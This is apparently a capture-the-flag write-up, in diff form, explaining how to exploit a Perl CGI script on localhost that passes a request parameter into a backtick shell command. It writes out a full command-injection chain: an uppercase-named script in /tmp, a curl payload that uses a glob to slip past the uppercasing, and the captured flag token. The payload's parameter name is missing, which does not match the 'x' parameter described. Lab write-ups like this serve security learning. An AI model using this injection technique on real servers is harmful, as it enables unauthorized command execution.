@@ -1,0 +1,29 @@
+# In the home repository we can found a perl script that is executed on localhost:4646
+# We can see that the program takes two params ('x' and 'y') where x is used in the t function
+# The 'y' variable is useless
+# We can see a regex is executed on the 'x' param
+
+  9   $xx =~ tr/a-z/A-Z/;
+ 10   $xx =~ s/\s.*//;
+
+# All letters is now upper and all spaces are deleted
+# We can see on the next line the potential exploit where bash command is executed
+
+ 11   @output = `egrep "^$xx" /tmp/xd 2>&1`;
+
+# Because of the regex we can't even try to execute `getflag > FILE` but we can try to execute file created in UPPERCASE
+# Let's create a sh script which will execute getflag and redirect the output in a file to access to it
+
+ #!/bin/sh
+ getflag > /tmp/flag
+
+# Move this script in /tmp folder and give execution access to it
+
+chmod +x /tmp/GETFLAG
+
+# Execute the curl command with * identifier to avoid CAPS on /tmp folder
+
+curl localhost:4646?='`/*/GETFLAG`'
+cat /tmp/flag
+
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
